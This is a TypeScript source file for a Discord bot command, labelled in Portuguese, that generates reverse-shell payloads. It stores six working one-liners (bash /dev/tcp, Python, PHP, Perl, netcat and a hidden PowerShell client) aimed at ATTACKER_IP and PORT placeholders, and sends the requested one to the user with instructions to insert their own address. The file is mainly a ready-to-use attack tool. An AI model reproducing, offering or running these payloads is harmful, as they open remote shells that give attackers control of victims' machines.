import type { Message } from 'discord.js';
import type { PrefixCommand } from '../../ai/commandRegistry.js';

const PAYLOADS: Record<string, string> = {
  'bash': 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
  'python': 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\' ',
  'php': 'php -r \'$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");\' ',
  'perl': 'perl -e \'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' ',
  'nc': 'nc -e /bin/sh ATTACKER_IP PORT',
  'powershell': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
};

export const prefixCommand: PrefixCommand = {
  trigger: 'payload',
  description: 'Gera payloads de reverse shell',
  async execute(message: Message, args: string[]) {
    const type = args[0]?.toLowerCase();
    if (!type || !PAYLOADS[type]) return message.reply(`Tipos disponíveis: ${Object.keys(PAYLOADS).join(', ')}\nUso: ;payload <tipo>`);
    
    await message.reply(`💀 **Payload ${type.toUpperCase()}:**\n\`\`\`\n${PAYLOADS[type]}\n\`\`\`\n*Substitua ATTACKER_IP e PORT pelos seus dados.*`);
  }
};